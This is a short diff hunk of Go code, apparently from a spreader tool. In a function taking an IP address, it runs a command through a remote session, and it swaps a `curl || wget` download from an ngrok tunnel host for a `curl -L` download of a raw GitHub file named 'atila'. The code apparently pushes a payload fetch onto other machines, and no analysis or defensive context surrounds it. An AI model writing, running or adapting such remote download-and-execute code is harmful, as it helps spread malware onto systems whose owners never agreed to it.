@@ -107,7 +107,7 @@ func fun(ip string) {
 			}
 
 
-er := session.Run("curl   https://knapsack-trickster-dance.ngrok-free.dev/teste  || wget  https://knapsack-trickster-dance.ngrok-free.dev/teste")
+er := session.Run("curl -L https://github.com/atilabyte/golang/raw/refs/heads/master/atila  ")
 
 
                  
